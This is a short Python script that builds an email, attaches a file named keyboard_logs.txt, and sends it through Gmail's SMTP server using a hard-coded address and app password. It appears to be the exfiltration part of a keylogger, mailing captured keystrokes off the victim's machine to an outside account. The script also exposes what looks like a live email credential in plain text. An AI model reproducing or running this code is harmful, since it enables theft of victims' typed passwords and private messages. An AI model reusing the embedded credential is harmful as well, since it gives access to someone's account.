#!/usr/local/bin/python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders 

#SMTP server configuration 
smtp_server = 'smtp.gmail.com'
smtp_port = 587
email = 'ps9488348@gmail.com'
password = 'cfhm vwde lwxm heyv'

#Email details
recipient_email = 'ps9488348@gmail.com'
subject = 'Test Subject'
body = 'this is a test email sent using smtplib in Python'

#Create the email message 
msg = MIMEMultipart()
msg['From'] = email
msg['To'] = recipient_email
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))

#Create a MIMEBase object for the attachment 
attachment = MIMEBase('application', 'octet-stream')
try:
    with open('keyboard_logs.txt', 'rb') as file:
        attachment.set_payload(file.read())
    #Encode and add to the email 
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 'attachment', filename='keyboard_logs.txt')
    msg.attach(attachment)
except FileNotFoundError:
    print('Attachment file not found. Sending email without attachment')

def mail_file():
    #Send the email 
    try:
        #Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.send_message(msg)
        print('Email sent successfully')
    except Exception as e:
        print(f'Error: {e}')
    finally:
        server.quit()
mail_file()